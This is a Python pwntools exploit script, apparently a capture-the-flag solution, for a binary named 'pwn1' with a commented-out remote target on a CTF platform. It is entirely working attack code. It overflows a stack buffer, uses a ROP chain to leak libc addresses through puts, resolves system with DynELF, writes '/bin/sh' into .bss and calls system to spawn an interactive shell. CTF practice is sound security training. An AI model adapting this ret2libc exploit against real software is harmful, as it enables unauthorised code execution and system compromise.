#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

#  context.log_level = "debug"
sh = process('./pwn1')
#  sh = remote("node3.buuoj.cn", 25809)

elf = ELF("./pwn1")

puts_plt = elf.symbols["puts"]

puts_got = elf.got['puts']
log.info("puts_got -> " + hex(puts_got))

gets_plt = elf.symbols['gets']
log.info("gets_plt -> " + hex(gets_plt))
pop_rdi_ret = 0x00400793
start_addr = 0x400580
bss_start = 0x601070
ret = 0x0000000000400501

sh.recv()

def leak(address):
    data = ''
    payload = 'a' * 0x30 + 'b' * 0x8 
    payload += p64(pop_rdi_ret) + p64(address) + p64(puts_plt) + p64(start_addr)

    sh.sendline(payload)
    sh.recvuntil("11.28125\n")
    up = ""
    while True:
        c = sh.recv(numb=1, timeout=1)
        if up == '\n' and c == "L":
            data = data[:-1]
            data += "\x00"
            break
        else:
            data += c
        up = c

    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data


dynelf = DynELF(leak, elf=elf)
system_addr = dynelf.lookup("__libc_system", "libc")
log.info("system addr -> " + hex(system_addr))



log.info("------------------------- Read /bin/sh ---------------------------")
payload = 'a' * 0x30 + 'b' * 0x8 + p64(pop_rdi_ret) + p64(bss_start) + p64(gets_plt) + p64(start_addr)

#  gdb.attach(sh)
sh.sendline(payload)

sh.recvuntil("11.28125\n")

sh.sendline("/bin/sh\x00")
log.info("------------------------- Read /bin/sh over -------------------------")
#  gdb.attach(sh)
payload = 'a' * 0x30 + 'b' * 0x8 + p64(ret) + p64(pop_rdi_ret) + p64(bss_start) + p64(system_addr) + p64(start_addr)

log.info(sh.recv())
sh.sendline(payload)


sh.interactive()
